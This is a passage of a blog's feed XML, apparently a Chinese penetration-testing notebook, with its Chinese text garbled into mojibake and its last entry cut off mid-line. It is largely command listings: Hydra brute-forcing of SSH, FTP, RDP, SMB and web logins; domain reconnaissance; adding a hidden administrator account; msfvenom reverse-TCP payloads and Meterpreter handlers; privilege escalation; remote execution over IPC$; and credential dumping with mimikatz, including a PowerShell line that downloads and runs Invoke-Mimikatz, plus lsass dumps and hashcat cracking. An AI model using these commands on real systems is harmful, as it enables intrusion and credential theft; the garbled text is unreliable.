      &lt;h2 id=&quot;æ¼æ´åˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼&quot;&gt;&lt;a href=&quot;#æ¼æ´åˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´åˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼:&quot;&gt;&lt;/a&gt;&lt;strong&gt;æ¼æ´åˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼:&lt;/strong&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CVE-2017-12615æ¼æ´åˆ©ç”¨éœ€è¦åœ¨Windowsç¯å¢ƒï¼Œä¸”éœ€è¦å°† readonly åˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼Œç»è¿‡å®é™…æµ‹è¯•ï¼ŒTomcat 7.xç‰ˆæœ¬å†…web.xmlé…ç½®æ–‡ä»¶å†…é»˜è®¤é…ç½®æ— readonlyå‚æ•°ï¼Œéœ€è¦æ‰‹å·¥æ·»åŠ ï¼Œé»˜è®¤é…ç½®æ¡ä»¶ä¸‹ä¸å—æ­¤æ¼æ´å½±å“ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="æ¼æ´å¤ç°" scheme="https://yaalonsong.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="æ¼æ´å¤ç°" scheme="https://yaalonsong.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Hydra çš„ä½¿ç”¨</title>
    <link href="https://yaalonsong.github.io/2019/02/26/hydra-%E7%9A%84%E4%BD%BF%E7%94%A8.html"/>
    <id>https://yaalonsong.github.io/2019/02/26/hydra-çš„ä½¿ç”¨.html</id>
    <published>2019-02-26T15:11:39.873Z</published>
    <updated>2019-02-26T15:24:12.702Z</updated>
    
    <content type="html"><![CDATA[<p>å­—å…¸é›†<br><a href="https://www.weakpass.com/" target="_blank" rel="noopener">https://www.weakpass.com/</a><br>1.ç ´è§£ssh<br>ï¼ˆ1ï¼‰ç ´è§£æŒ‡å®šç”¨æˆ·åå¯†ç </p><blockquote><p>hydra ip ssh -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -t çº¿ç¨‹(é»˜è®¤16) -vV<br>hydra ip ssh -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -e ns -vV</p></blockquote><a id="more"></a><p>ï¼ˆ2ï¼‰æ‰¹é‡ç ´è§£sshè´¦å·å’Œå¯†ç </p><blockquote><p>hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ssh -V<br>hydra -L list_user -P list_password 192.168.56.101 ssh -V</p></blockquote><p>2.ç ´è§£ftp</p><p>ï¼ˆ1ï¼‰ç ´è§£æŒ‡å®šç”¨æˆ·åå¯†ç </p><blockquote><p>hydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -t çº¿ç¨‹(é»˜è®¤16) -vV<br>hydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -e ns -vV</p></blockquote><p>ï¼ˆ2ï¼‰æ‰¹é‡ç ´è§£FTPè´¦å·å’Œå¯†ç </p><blockquote><p>hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ftp -V<br>hydra -L list_user -P list_password 192.168.56.101 ftp -V</p></blockquote><p>3ï¼GETæ–¹å¼æäº¤ï¼Œç ´è§£Webç™»å½•</p><blockquote><p>hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns ip http-get /admin/<br>hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns -f ip http-get /admin/index.php</p></blockquote><p> 4ï¼POSTæ–¹å¼æäº¤ï¼Œç ´è§£Webç™»å½•4ï¼POSTæ–¹å¼æäº¤ï¼Œç ´è§£Webç™»å½•</p><p>ï¼ˆ1ï¼‰hydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -s 80 ip http-post-form â€œ/admin/login.php: username= ^USER^ &amp;password=^PASS^&amp;submit=login:sorry passwordâ€</p><blockquote><p>hydra -L list_user -P list_password 192.168.0.115 http-post-form â€œmember.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failedâ€ â€“V</p></blockquote><p>ï¼ˆ2ï¼‰å¯¹adminå¯†ç è¿›è¡Œç ´è§£</p><blockquote><p>hydra -t 3 -l admin -P pass.txt -o out.txt -f 192.168.0.115 http-post-form â€œlogin.php:id=^USER^&amp;passwd=^PASS^:<title>wrong username or password</title>â€œ</p></blockquote><p>â€œ-tâ€è¡¨ç¤ºåŒæ—¶çº¿ç¨‹æ•°ä¸º3ï¼›â€œ-lâ€è¡¨ç¤ºç”¨æˆ·åæ˜¯â€œadminâ€ï¼Œå­—å…¸ä¸ºpass.txtï¼Œä¿å­˜ä¸ºout.txtï¼›â€œ-fâ€è¡¨ç¤ºç ´è§£1ä¸ªå¯†ç å°±åœæ­¢ï¼›â€œ192.168.0.115â€è¡¨ç¤ºç›®æ ‡IPåœ°å€ï¼›â€œhttp-post-formâ€è¡¨ç¤ºé‡‡ç”¨HTTPçš„POSTæ–¹å¼æäº¤è¡¨å•å¯†ç ç ´è§£ï¼›</p><p>5ï¼ç ´è§£HTTPS</p><blockquote><p>hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https</p></blockquote><p>6ï¼ç ´è§£teamspeak</p><blockquote><p>hydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -s ç«¯å£å· -vV ip teamspeak</p></blockquote><p>7ï¼ç ´è§£Cisco</p><blockquote><p>hydra -P pass.txt 192.168.0.115 cisco<br>hydra -m cloud -P pass.txt 192.168.0.115 cisco-enable</p></blockquote><p>8ï¼ç ´è§£SMB</p><blockquote><p>hydra -l administrator -P pass.txt 192.168.0.115 smb</p></blockquote><p>9ï¼ç ´è§£POP3</p><blockquote><p>hydra -l muts -P pass.txt my.pop3.mail pop3</p></blockquote><p>10ï¼ç ´è§£è¿œç¨‹ç»ˆç«¯è´¦å·</p><p>ï¼ˆ1ï¼‰ç ´è§£ç®¡ç†å‘˜è´¦å·</p><blockquote><p>hydra ip rdp -l administrator -P pass.txt -V</p></blockquote><p>ï¼ˆ2ï¼‰æ‰¹é‡ç ´è§£è´¦å·</p><blockquote><p>hydra -s 3389 192.168.44.138 rdp -L user.txt  -P pwd.txt â€“V</p></blockquote><p>11ï¼ç ´è§£HTTP-Proxy</p><blockquote><p>hydra -l admin -P pass.txt http-proxy://192.168.0.115</p></blockquote><p>12ï¼ç ´è§£IMAP</p><blockquote><p>hydra -L user.txt -p secret 192.168.0.115 imap PLAIN<br>hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å­—å…¸é›†&lt;br&gt;&lt;a href=&quot;https://www.weakpass.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.weakpass.com/&lt;/a&gt;&lt;br&gt;1.ç ´è§£ssh&lt;br&gt;ï¼ˆ1ï¼‰ç ´è§£æŒ‡å®šç”¨æˆ·åå¯†ç &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hydra ip ssh -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -t çº¿ç¨‹(é»˜è®¤16) -vV&lt;br&gt;hydra ip ssh -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -e ns -vV&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="kali" scheme="https://yaalonsong.github.io/categories/kali/"/>
    
    
      <category term="hydra" scheme="https://yaalonsong.github.io/tags/hydra/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€å°è®°</title>
    <link href="https://yaalonsong.github.io/2019/02/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8F%E8%AE%B0.html"/>
    <id>https://yaalonsong.github.io/2019/02/26/å†…ç½‘æ¸—é€å°è®°.html</id>
    <published>2019-02-26T14:33:16.702Z</published>
    <updated>2019-08-08T17:33:08.863Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¸¸ç”¨ä¸€å¥è¯webshell"><a href="#å¸¸ç”¨ä¸€å¥è¯webshell" class="headerlink" title="å¸¸ç”¨ä¸€å¥è¯webshell"></a>å¸¸ç”¨ä¸€å¥è¯webshell</h2><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><a id="more"></a><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dnscmd &lt;servername&gt; /ZonePrint &lt;zonename&gt;  æŸ¥çœ‹dnsåˆ—è¡¨ï¼ˆDCæ‰§è¡Œï¼‰</span><br><span class="line">tasklist /SVC   æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹åŠå…¶æè¿°</span><br><span class="line">query user || qwinsta æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</span><br><span class="line">net user  æŸ¥çœ‹æœ¬æœºç”¨æˆ·</span><br><span class="line">net user /domain æŸ¥çœ‹åŸŸç”¨æˆ·</span><br><span class="line">net view &amp; net group &quot;domain computers&quot; /domain æŸ¥çœ‹å½“å‰åŸŸè®¡ç®—æœºåˆ—è¡¨ ç¬¬äºŒä¸ªæŸ¥çš„æ›´å¤š</span><br><span class="line">net view /domain æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ</span><br><span class="line">net view \\\\dc   æŸ¥çœ‹ dc åŸŸå†…å…±äº«æ–‡ä»¶</span><br><span class="line">net group /domain æŸ¥çœ‹åŸŸé‡Œé¢çš„ç»„</span><br><span class="line">net group &quot;domain admins&quot; /domain æŸ¥çœ‹åŸŸç®¡</span><br><span class="line">net localgroup administrators /domain   /è¿™ä¸ªä¹Ÿæ˜¯æŸ¥åŸŸç®¡ï¼Œæ˜¯å‡çº§ä¸ºåŸŸæ§æ—¶ï¼Œæœ¬åœ°è´¦æˆ·ä¹Ÿæˆä¸ºåŸŸç®¡</span><br><span class="line">net group &quot;domain controllers&quot; /domain åŸŸæ§</span><br><span class="line">net time /domain </span><br><span class="line">net config workstation   å½“å‰ç™»å½•åŸŸ - è®¡ç®—æœºå - ç”¨æˆ·å</span><br><span class="line">net use \\\\åŸŸæ§(å¦‚pc.xx.com) password /user:xxx.com\username ç›¸å½“äºè¿™ä¸ªå¸å·ç™»å½•åŸŸå†…ä¸»æœºï¼Œå¯è®¿é—®èµ„æº</span><br><span class="line">ipconfig</span><br><span class="line">systeminfo</span><br><span class="line">tasklist /svc   è¯¦ç»†è¿›ç¨‹ä¿¡æ¯</span><br><span class="line">tasklist /S ip /U domain\username /P /V æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœº tasklist</span><br><span class="line">taskkill /im  imagename  /f  ç»“æŸè¿›ç¨‹</span><br><span class="line">net localgroup administrators &amp;&amp; whoami æŸ¥çœ‹å½“å‰æ˜¯ä¸æ˜¯å±äºç®¡ç†ç»„</span><br><span class="line">netstat -ano</span><br><span class="line">nltest /dclist:xx  æŸ¥çœ‹åŸŸæ§</span><br><span class="line">nltest /domain_trusts   æŸ¥çœ‹åŸŸä¿¡ä»»ä¿¡æ¯</span><br><span class="line">whoami /all æŸ¥çœ‹ Mandatory Label uac çº§åˆ«å’Œ sid å·</span><br><span class="line">net sessoin æŸ¥çœ‹è¿œç¨‹è¿æ¥ session (éœ€è¦ç®¡ç†æƒé™)</span><br><span class="line">net share     å…±äº«ç›®å½•</span><br><span class="line">cmdkey /l   æŸ¥çœ‹ä¿å­˜ç™»é™†å‡­è¯</span><br><span class="line">echo %logonserver%  æŸ¥çœ‹ç™»é™†åŸŸ</span><br><span class="line">spn â€“l administrator spn è®°å½•</span><br><span class="line">set  ç¯å¢ƒå˜é‡</span><br><span class="line">dsquery server - æŸ¥æ‰¾ç›®å½•ä¸­çš„ AD DC/LDS å®ä¾‹</span><br><span class="line">dsquery user - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç”¨æˆ·</span><br><span class="line">dsquery computer æŸ¥è¯¢æ‰€æœ‰è®¡ç®—æœºåç§° windows 2003</span><br><span class="line">dir /s *.exe æŸ¥æ‰¾æŒ‡å®šç›®å½•ä¸‹åŠå­ç›®å½•ä¸‹æ²¡éšè—æ–‡ä»¶</span><br><span class="line">arp -a</span><br><span class="line">tracert  æŸ¥è·¯ç”±</span><br></pre></td></tr></table></figure><h2 id="windows-ä¸‹è½½æ–‡ä»¶"><a href="#windows-ä¸‹è½½æ–‡ä»¶" class="headerlink" title="windows ä¸‹è½½æ–‡ä»¶"></a>windows ä¸‹è½½æ–‡ä»¶</h2><ul><li><p>bitsadmin</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">downloadæ–‡ä»¶</span><br><span class="line">bitsadmin /transfer n https://www.baidu.com/robots.txt c:\<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä¸€æ¡å‘½ä»¤downloadæ–‡ä»¶</span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'https://www.baidu.com/robots.txt'</span>,<span class="string">'C:\1.txt'</span>)</span><br><span class="line">å¤šæ¡å‘½ä»¤downloadæ–‡ä»¶</span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">new-object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$client</span>.DownloadFile(<span class="string">'https://www.baidu.com/robots.txt'</span>, <span class="string">'C:\1.txt'</span>)</span><br></pre></td></tr></table></figure></li><li><p>certutil.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c certutil.exe -urlcache -split -f https://www.baidu.com/robots.txt</span><br></pre></td></tr></table></figure></li></ul><h2 id="æ·»åŠ åˆ é™¤ç”¨æˆ·æ“ä½œ"><a href="#æ·»åŠ åˆ é™¤ç”¨æˆ·æ“ä½œ" class="headerlink" title="æ·»åŠ åˆ é™¤ç”¨æˆ·æ“ä½œ"></a>æ·»åŠ åˆ é™¤ç”¨æˆ·æ“ä½œ</h2><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin1 P@ssw0rd /add &amp; net localgroup administrators admin1 /add    æ·»åŠ ç”¨æˆ·å¹¶è®¾ç½®ç®¡ç†å‘˜</span><br><span class="line">net user admin1 /del</span><br></pre></td></tr></table></figure></li></ul><h2 id="å†…ç½‘ä»£ç†å·¥å…·"><a href="#å†…ç½‘ä»£ç†å·¥å…·" class="headerlink" title="å†…ç½‘ä»£ç†å·¥å…·"></a>å†…ç½‘ä»£ç†å·¥å…·</h2><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h4><p>tools:<br><a href="http://rootkiter.com/EarthWorm" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm</a><br>æ­£å‘ï¼š<br>è¢«æ”»å‡»æœº(è·³æ¿)ï¼š</p><blockquote><p>./ew_for_Linux -s ssocksd -l 9999 (ä¾¦å¬ 0.0.0.0:9999)<br>netstat -pantu|grep 9999 (æŸ¥çœ‹æ˜¯å¦ä¾¦å¬æˆåŠŸ)</p></blockquote><p>æ”»å‡»æœºï¼š</p><blockquote><p>proxychain è®¾ç½® socks5 ä¸ºè·³æ¿ ip port<br>proxychain nmap å³å¯ä»¥ç”¨è·³æ¿ä»£ç†æ‰«æå…¶ä»–ä¸»æœº</p></blockquote><h4 id="netsh-Windows-è‡ªå¸¦å·¥å…·-windows-ç«¯å£è½¬å‘"><a href="#netsh-Windows-è‡ªå¸¦å·¥å…·-windows-ç«¯å£è½¬å‘" class="headerlink" title="netsh   Windows è‡ªå¸¦å·¥å…·   windows ç«¯å£è½¬å‘"></a>netsh   Windows è‡ªå¸¦å·¥å…·   windows ç«¯å£è½¬å‘</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4  listenaddress=0.0.0.0 listenport=53 connectaddress=10.10.10.4  connectport=8880</span><br><span class="line">netsh interface  portproxy show  v4tov4</span><br><span class="line">netsh interface portproxy delete v4tov4  listenaddress=0.0.0.0 listenport=53</span><br></pre></td></tr></table></figure><p>MSFåå¼¹ shell  </p><blockquote><p>msfvenom -a x86 â€“platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe </p></blockquote><p>1.ç”Ÿæˆä¸€ä¸ªå›è¿æœ¨é©¬</p><blockquote><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=443 -f dll&gt;/root/Desktop/443.dll</p></blockquote><p>2.ç”Ÿæˆæœ¨é©¬åï¼Œæˆ‘ä»¬åœ¨èœåˆ€é‡Œæ”¾å…¥ç”Ÿæˆçš„æœ¨é©¬ï¼Œè¿è¡Œï¼ŒåŒæ—¶æ‰“å¼€msfå‡†å¤‡å›è¿</p><blockquote><p>use exploit/multi/handler </p><p>set payload windows/meterpreter/reverse_tcp<br>set LHOST 192.168.2.111<br>set lport 443<br>run</p></blockquote><p>4.ææƒ</p><blockquote><p>background æˆ– ctrl+z </p><p>use exploit/windows/local/ms11_080_afdjoinleaf<br>set session 1<br>run<br>hashdump      //å¯†ç è·å–<br>load mimikatz //ä½¿ç”¨mimikatz<br>kerberos      //æŸ¥çœ‹è§£å¯†</p></blockquote><p>5.æ–°åŠ è·¯ç”±æŸ¥çœ‹å­ç½‘</p><blockquote><p>route<br>background<br>sessions<br>route add 192.168.2.0 255.255.255.0 2<br>search mssql   //æ‰¾mssqlæ¨¡å—<br>use auxiliary/scanner/mssql/mssql_login  //ä½¿ç”¨loginæ¨¡å—</p><p>show options </p><p>set rhosts 192.168.177.1/24 </p><p>set password sa@123<br>run<br>show options<br>set BEUTEFORCE_SPEED 0<br>run</p></blockquote><p>ç«¯å£æ‰«æsearch portscan </p><blockquote><p>use   auxiliary/scanner/portscan/tcp  //ä½¿ç”¨scanneræ¨¡å—<br>show options<br>set RHOSTS 192.168.2.0/24<br>set ports 139,445,3389  //è®¾ç½®æ‰«æç«¯å£</p></blockquote><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc$"></a>ipc$</h2><blockquote><p>D:&gt;net use \192.168.1.254\c$ â€œpwdâ€ /user:user     //è¿æ¥192.168.1.254çš„IPC$å…±äº«ï¼Œç”¨uncè·¯å¾„<br>D:&gt;copy srv.exe \192.168.1.254\c$ //å¤åˆ¶æœ¬åœ° srv.exe åˆ°Cæ ¹ç›®å½•<br>D:&gt;net time \192.168.1.254         //æŸ¥æ—¶é—´<br>D:&gt;atã€€\192.168.1.254 10:50 srv.exe //ç”¨atå‘½ä»¤åœ¨10ç‚¹50åˆ†å¯åŠ¨ srv.exe<br>D:&gt;net use \192.168.1.254\c$ /del</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å¸¸ç”¨ä¸€å¥è¯webshell&quot;&gt;&lt;a href=&quot;#å¸¸ç”¨ä¸€å¥è¯webshell&quot; class=&quot;headerlink&quot; title=&quot;å¸¸ç”¨ä¸€å¥è¯webshell&quot;&gt;&lt;/a&gt;å¸¸ç”¨ä¸€å¥è¯webshell&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/tennc/webshell&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/tennc/webshell&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="å†…ç½‘æ¸—é€" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="å†…ç½‘æ¸—é€" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="MSF" scheme="https://yaalonsong.github.io/tags/MSF/"/>
    
  </entry>
  
  <entry>
    <title>Hashcat Readme</title>
    <link href="https://yaalonsong.github.io/2019/01/18/hashcat-readme.html"/>
    <id>https://yaalonsong.github.io/2019/01/18/hashcat-readme.html</id>
    <published>2019-01-17T16:28:52.000Z</published>
    <updated>2019-02-26T15:24:05.092Z</updated>
    
    <content type="html"><![CDATA[<p>#################################################################<br>&amp;               hashcat4.0.1 or 4.1.0                                                                            &amp;</p><p>#################################################################</p><a id="more"></a><p>hash r.txtæ–‡ä»¶æ ¼å¼   ç”¨æˆ·å:hash</p><p>â€“show å¯¼å‡ºå·²ç ´è§£çš„ç”¨æˆ·å:å¯†ç    outr.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 â€“show â€“outfile=C:\Users\hash\Desktop\outr.txt â€“outfile-format 3 â€“username c:\Users\hash\Desktop\r.txt </p></blockquote><p>â€“left å¯¼å‡ºæœªç ´è§£çš„ç”¨æˆ·å:hash   leftr.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 â€“left â€“outfile=C:\Users\hash\Desktop\leftr.txt â€“outfile-format 1 â€“username c:\Users\hash\Desktop\r.txt</p></blockquote><p>å¢åŠ å¯†ç å¤æ‚åº¦å‘½ä»¤ç ´è§£leftr.txtï¼ˆæœªç ´è§£çš„ç”¨æˆ·å:hashï¼‰</p><blockquote><p>hashcat64.exe -a 3 -m 1000 â€“outfile=C:\Users\hash\Desktop\outr1.txt â€“outfile-format 3 â€“username c:\Users\hash\Desktop\leftr.txt â€“increment â€“increment-min=6 â€“increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a â€“force</p></blockquote><p>ç»“æŸä»¥åå¯¼å‡ºæœªçˆ†ç ´ç”¨æˆ·ååŠ hash.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 â€“left â€“outfile=C:\Users\hash\Desktop\leftr2.txt â€“outfile-format 1 â€“username c:\Users\hash\Desktop\leftr.txt</p><p>hashcat64.exe -a 3 -m 1000 â€“outfile=C:\Users\hash\Desktop\out-1.txt â€“outfile-format 3 â€“username c:\Users\hash\Desktop\1.txt â€“increment â€“increment-min=6 â€“increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a â€“force</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#################################################################&lt;br&gt;&amp;amp;               hashcat4.0.1 or 4.1.0                                                                            &amp;amp;&lt;/p&gt;
&lt;p&gt;#################################################################&lt;/p&gt;
    
    </summary>
    
      <category term="å¯†ç ç ´è§£" scheme="https://yaalonsong.github.io/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="hashcat" scheme="https://yaalonsong.github.io/tags/hashcat/"/>
    
  </entry>
  
  <entry>
    <title>æŠ“å– Windows ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ· hash çš„å¤šç§å§¿åŠ¿</title>
    <link href="https://yaalonsong.github.io/2018/10/18/%E6%8A%93hash.html"/>
    <id>https://yaalonsong.github.io/2018/10/18/æŠ“hash.html</id>
    <published>2018-10-18T14:45:02.000Z</published>
    <updated>2019-02-26T15:19:24.693Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æŠ“å–-Windows-ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ·-hash-çš„å¤šç§å§¿åŠ¿"><a href="#æŠ“å–-Windows-ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ·-hash-çš„å¤šç§å§¿åŠ¿" class="headerlink" title="æŠ“å– Windows ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ· hash çš„å¤šç§å§¿åŠ¿"></a>æŠ“å– Windows ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ· hash çš„å¤šç§å§¿åŠ¿</h2><blockquote><p>Ntds.ditæ˜¯ä¸»è¦çš„ADæ•°æ®åº“ï¼ŒåŒ…æ‹¬æœ‰å…³åŸŸç”¨æˆ·ï¼Œç»„å’Œç»„æˆå‘˜èº«ä»½çš„ä¿¡æ¯ã€‚å®ƒè¿˜åŒ…æ‹¬åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ã€‚ä¸ºäº†è¿›ä¸€æ­¥ä¿æŠ¤å¯†ç å“ˆå¸Œå€¼ï¼Œä½¿ç”¨å­˜å‚¨åœ¨SYSTEMæ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­çš„å¯†é’¥å¯¹è¿™äº›å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ã€‚ç¬¬äºŒä¸ªåŠ å¯†æ­¥éª¤æ˜¯ä¸ºäº†æ‰§è¡Œå¯†ç è½¬å‚¨ä»¥è¿›è¡Œå®¡è®¡ï¼Œéœ€è¦ä¸¤ä¸ªæ–‡ä»¶çš„å‰¯æœ¬ã€‚<a id="more"></a></p><p>æ‰§è¡Œå¯†ç å®‰å…¨å®¡æ ¸æ‰€éœ€çš„ä¸»è¦æ­¥éª¤æ˜¯è·å–åŒ…å«ä¿¡æ¯çš„æ–‡ä»¶ï¼Œä»æ–‡ä»¶ä¸­è½¬å‚¨å¯†ç å“ˆå¸Œå€¼ï¼Œç„¶åä½¿ç”¨å¯†ç ç ´è§£ç¨‹åºæµ‹è¯•å¼±å¯†ç çš„è¿™äº›å“ˆå¸Œå€¼ã€‚</p><p>é€šè¿‡è·å–Ntds.ditå’ŒSYSTEMæ–‡ä»¶çš„å‰¯æœ¬ï¼Œæœ€å¯é çš„æ‰§è¡Œå¯†ç å®¡è®¡çš„æ–¹æ³•æ˜¯è„±æœºçš„ã€‚ç”±äºWindowsé˜»æ­¢è¿™äº›æ“ä½œé˜»æ­¢æ ‡å‡†è¯»å–æˆ–å¤åˆ¶ï¼Œå› æ­¤å¿…é¡»ä½¿ç”¨ç‰¹æ®ŠæŠ€æœ¯æ¥è·å–å‰¯æœ¬ã€‚</p></blockquote><ul><li><p>ä½¿ç”¨mimikatzæœ¬æœºæµ‹è¯•ç›´æ¥è·å–å†…å­˜ä¸­çš„æ˜æ–‡å¯†ç </p></li><li><p>mimikatz åªèƒ½æŠ“å–ç™»é™†è¿‡çš„ç”¨æˆ·hashï¼Œæ— æ³•æŠ“å–æ‰€æœ‰ç”¨æˆ·,éœ€è¦å…æ€</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li><li><p>éäº¤äº’å¼æŠ“æ˜æ–‡å¯†ç (webshellä¸­)</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" &gt; password.txt</span><br></pre></td></tr></table></figure></li><li><p>powershellåŠ è½½mimikatzæŠ“å–å¯†ç </p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz</span><br></pre></td></tr></table></figure></li><li><p>ProcDump + Mimikatz</p></li></ul><p>==ps:mimikatzçš„å¹³å°ï¼ˆplatformï¼‰è¦ä¸è¿›è¡Œdumpçš„ç³»ç»Ÿ(source dump)å…¼å®¹(æ¯”å¦‚ç›®æ ‡08çš„,æœ¬åœ°å°±è¦ç”¨08ç³»ç»Ÿæ¥åˆ†æ)==</p><p>è¿œç¨‹ä¸»æœºï¼š<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Procdump.exe -accepteula -ma lsass.exe c:\a.dmp    </span><br><span 